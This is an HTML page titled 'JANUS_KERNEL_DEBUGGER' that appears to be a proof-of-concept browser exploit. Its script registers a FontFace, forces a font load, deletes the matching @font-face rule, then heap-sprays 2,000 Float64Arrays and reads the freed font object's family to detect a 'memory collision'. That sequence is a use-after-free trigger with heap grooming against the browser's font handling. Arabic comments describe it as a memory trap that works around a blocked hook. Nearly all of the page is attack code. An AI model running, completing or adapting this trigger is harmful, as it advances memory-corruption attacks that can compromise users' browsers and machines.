<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        #console { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; background: #0a0a0a; font-size: 12px; }
        .log { margin-bottom: 3px; border-bottom: 1px solid #111; }
    </style>
</head>
<body>
    <h3>JANUS_KERNEL_DEBUGGER v2.0 [STABLE_TRIGGER]</h3>
    <div id="console"></div>
    <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>

    <script>
        const log = (msg) => {
            const consoleDiv = document.getElementById('console');
            consoleDiv.innerHTML += `<div class="log">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        };

        window.onload = async () => {
            log("INIT: Kernel Debugger Active.");
            
            // 1. إعداد الفخ (The Memory Trap)
            let A = new FontFace('targetFont', 'url(https://invalid.url)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            
            log("Monitoring font status...");

            // 2. استخدام التوقيت المعتمد بدلاً من الـ Hook المحجوب
            // سنراقب متى يبدأ المحرك بمعالجة الخط
            try {
                // محاولة التحميل القسري
                document.fonts.load('1em targetFont', 'AB');
                
                // نستخدم setTimeout لضمان أننا في الـ Event Loop الصحيح بعد محاولة التحميل
                setTimeout(() => {
                    log("Triggering Rule Deletion...");
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    log("Heap Grooming: Spraying ArrayBuffers...");
                    window.spray = [];
                    for (let i = 0; i < 2000; i++) {
                        let buf = new Float64Array(32);
                        buf[0] = 0.555;
                        window.spray.push(buf);
                    }
                    
                    log("Grooming complete. Checking for memory collision...");
                    
                    // محاولة القراءة النهائية
                    try {
                        let val = A.family;
                        log("READ_RESULT: " + val);
                    } catch(err) {
                        log("READ_STATUS: " + err.message);
                    }
                }, 100);

            } catch(e) {
                log("FATAL_ERROR: " + e.message);
            }
        };
    </script>
</body>
</html>
